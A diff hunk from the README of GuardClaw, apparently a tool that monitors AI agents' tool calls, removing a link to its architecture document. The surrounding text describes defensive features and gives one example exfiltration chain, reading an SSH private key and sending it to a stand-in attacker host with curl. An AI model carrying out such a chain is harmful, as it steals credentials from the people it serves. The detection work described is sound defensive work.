@@ -124,8 +124,6 @@ GuardClaw has four core subsystems. The short version:
 - **Adaptive Memory & Chain Analysis.** Learns from your approve/deny decisions, tracks tool-call sequences per session, and flags multi-step exfiltration like `read ~/.ssh/id_rsa → curl evil.com`.
 - **Active Intervention.** Injects safety guidance into the agent's context before risky calls, dual-channel approval (agent dialog + dashboard + optional Telegram/Discord/WhatsApp push), circuit breaker on repeated denials, credential scanning on tool output, prompt injection detection, skill security review, and DTrace syscall monitoring (macOS).
 
-Full architecture walkthrough: [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)
-
 #### Fast Paths (before the LLM)
 
 Three checks run before the local judge to keep latency low:
